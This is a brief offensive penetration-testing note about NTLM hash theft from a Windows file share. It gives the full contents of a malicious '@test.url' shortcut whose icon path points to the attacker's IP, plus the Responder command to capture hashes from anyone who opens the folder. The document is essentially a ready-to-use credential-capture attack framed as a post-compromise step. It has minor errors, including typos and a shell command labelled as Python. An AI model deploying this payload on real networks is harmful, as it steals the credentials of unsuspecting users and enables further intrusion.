- - -
## Overview :
Imagine a senario, we have compromised a user and this user has any sort of share access.
we can utilise this access to capture more hashes via responder.

- - -

## Attacking Steps : 
create a file named “`@test.url`” inside the share forlder.

With the following contents :
```url
[InternetShortcut]  
URL=blah  
WorkingDirectory=blah  
IconFile=\\<our-ip>\%USERNAME%.icon  
IconIndex=1
```

```python
responder -I tun0 -v
```

Now wait for someone to open that share folder

![Imgur](https://i.imgur.com/fh9CLgt.png)

![Imgur](https://i.imgur.com/qIyXQyA.png)

- - -

